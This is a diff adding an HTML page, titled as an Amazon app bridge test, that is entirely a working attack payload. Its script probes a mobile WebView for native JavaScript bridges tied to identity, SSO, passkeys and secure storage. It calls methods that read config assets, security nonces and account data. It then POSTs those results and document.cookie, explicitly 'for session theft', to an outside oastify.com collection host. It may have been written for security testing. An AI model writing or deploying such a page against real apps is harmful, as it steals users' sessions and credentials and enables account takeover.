@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head><title>Amazon App Bridge Test</title></head>
+<body>
+<script>
+// Enumerate available JS bridges
+var bridges = [
+  'NativeInterface', 'AndroidInterface', 'smash', 'JSISecureStorage',
+  'ReactNativeWebView', 'APPToBrowserSSOJSBridge', 'MAPAndroidJSBridge',
+  'IDENTITY_MOBILE', 'FidoAuthenticatorJSBridge', 'IDENTITY_MOBILE_NAVIGATION',
+  'IDENTITY_MOBILE_PHONE_NUMBER_PICKER', 'IDENTITY_MOBILE_PASSKEY'
+];
+
+var available = [];
+for(var i = 0; i < bridges.length; i++) {
+  if(window[bridges[i]]) {
+    available.push(bridges[i]);
+  }
+}
+
+// Exfiltrate list of available bridges
+fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/available_bridges', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({bridges: available, userAgent: navigator.userAgent})
+});
+
+// Try calling high-value methods if bridges exist
+if(window.NativeInterface) {
+  try {
+    var result = NativeInterface.triggerJSEvent('{"useCase":"test","action":"probe"}');
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_result', {
+      method: 'POST', 
+      body: 'NativeInterface.triggerJSEvent result: ' + result
+    });
+  } catch(e) {
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_error', {
+      method: 'POST', 
+      body: 'NativeInterface error: ' + e.toString()
+    });
+  }
+}
+
+if(window.smash) {
+  try {
+    var asset = smash.asset('config.json');
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_asset', {
+      method: 'POST',
+      body: 'smash.asset(config.json): ' + asset.substring(0,1000)
+    });
+  } catch(e) {
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_error', {
+      method: 'POST',
+      body: 'smash error: ' + e.toString()
+    });
+  }
+}
+
+if(window.JSISecureStorage) {
+  try {
+    var nonce = JSISecureStorage.getNonce();
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_nonce', {
+      method: 'POST',
+      body: 'JSISecureStorage nonce: ' + nonce
+    });
+  } catch(e) {
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_error', {
+      method: 'POST',
+      body: 'JSISecureStorage error: ' + e.toString()
+    });
+  }
+}
+
+if(window.APPToBrowserSSOJSBridge) {
+  try {
+    APPToBrowserSSOJSBridge.getAccounts('{"requestId":"test123"}');
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/sso_accounts', {
+      method: 'POST',
+      body: 'APPToBrowserSSOJSBridge.getAccounts called'
+    });
+  } catch(e) {
+    fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/sso_error', {
+      method: 'POST',
+      body: 'SSO bridge error: ' + e.toString()
+    });
+  }
+}
+
+// Try to access document.cookie for session theft
+if(document.cookie) {
+  fetch('https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/cookies', {
+    method: 'POST',
+    body: 'Cookies: ' + document.cookie
+  });
+}
+</script>
+</body>
+</html>
